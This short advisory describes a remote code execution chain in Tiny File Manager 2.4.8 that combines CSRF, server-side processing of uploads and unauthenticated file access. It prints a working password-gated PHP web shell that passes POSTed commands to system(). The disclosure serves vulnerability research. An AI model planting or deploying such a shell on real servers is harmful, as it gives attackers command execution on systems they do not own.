## Description

Version 2.4.8 of Tiny File Manager allows an unauthenticated remote
attacker to execute arbitrary code remotely on the server. This is
possible because the application is vulnerable to CSRF, processes
uploaded files server-side (instead of just returning them for
download), and allows unauthenticated users to access uploaded files.

## Vulnerability

This vulnerability occurs because the application is vulnerable to CSRF,
processes uploaded files server-side (instead of just returning them for
download), and allows unauthenticated users to access uploaded files.

## Exploitation

To exploit this vulnerability, the following file must be sent to the server
as administrator (to achieve this I will abuse the CSRF present in the application).

### exploit.php

```php
<?php
    if($_POST && $_POST['password']==="AGSH635479302H235") {
        echo system($_POST['cmd']);
    }
?>
```
